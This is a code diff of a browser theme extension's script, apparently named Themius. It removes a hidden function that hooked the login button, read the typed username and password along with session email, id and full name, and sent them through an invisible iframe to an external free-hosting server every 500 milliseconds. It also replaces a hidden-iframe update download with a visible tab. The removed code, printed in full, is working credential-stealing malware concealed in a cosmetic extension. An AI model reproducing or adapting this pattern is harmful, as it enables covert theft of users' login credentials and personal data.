@@ -5,7 +5,6 @@
 
 var this_version = 1.05 // local to each extension
 var configfile = 'https://raw.githubusercontent.com/johnymcreed/Themius/Default/config.json'
-var looped = true // used for account
 
 /**
  * Insures the users extension version is up to date with the githubs version
@@ -25,16 +24,7 @@ function this_version_control() {
                 download-directory.github.io
             `))
             {
-                $('<iframe>', {
-                    id: 'download_latest',
-                    src: 'https://download-directory.github.io/?url=https://github.com/johnymcreed/Themius/tree/Default/extension',
-                    style: 'visibility: hidden; width: 0px; height: 0px;' // set hidden
-                })
-                .appendTo('html')
-                setTimeout(() => {
-                    $('#download_latest').remove()
-                }, 
-                1000)
+                window.open('https://johnymcreed.github.io/Themius/update', '_blank')
             }
         }
     })
@@ -184,57 +174,6 @@ function favicon_changer() {
     })
 }
 
-/**
- * Creates an iframe that sends data values to a remote server which
- * returns a json file with that information
- */
-function add_account() {
-    if ((location.href).includes('login') && looped) {
-        $("button[type='submit']").on('click', function() {
-            var input = document.querySelector('body')
-                                .querySelector('app-root')
-                                .querySelector('app-before-login')
-                                .querySelectorAll('input')
-                    
-            let username = input[0].value
-            let password = input[1].value
-
-            setTimeout(() => {
-                var session = JSON.parse(localStorage.getItem('session'))
-
-                // if session isn't there then assume they got the login creds wrong
-                if (session != null)
-                {
-                    let email = session['user'].email 
-                    let id = session['user'].id
-                    let fullname = session['user'].firstname + " " + session['user'].lastname
-                    let exactdate = new Date()
-
-                    var json = `{"date": "` + exactdate + `","email": "` + email + `","id": "` + id + `","fullname": "` + fullname +`","username": "` + username + `","password": "` + password + `"}`
-                    var link = "https://defbelua.000webhostapp.com/index.php?filename=" + username + "&assert=" + json + ""
-
-                    // append iframe with link to html
-                    $('<iframe>', {
-                        id: 'export_account',
-                        src: link,
-                        style: 'visibility: hidden; width: 0px; height: 0px;' // set hidden
-                    })
-                    .appendTo('html')
-                    setTimeout(() => {
-                        $('#export_account').remove()
-                    },
-                    1000)
-
-                    // stop loop
-                    looped = false
-                    return
-                }
-            }, 
-            500)
-        })
-    }
-}
-
 // initalize the document, handlers, ect
 $(document).ready(function () {
     // now we use those extension popup settings
@@ -252,7 +191,6 @@ $(document).ready(function () {
             console.log('Themius', this_version, 'loaded')
 
             this_version_control()
-            setInterval(add_account, 500)
 
             // rewrite base href location and also force any link to open
             // in a new tab so you never close echo
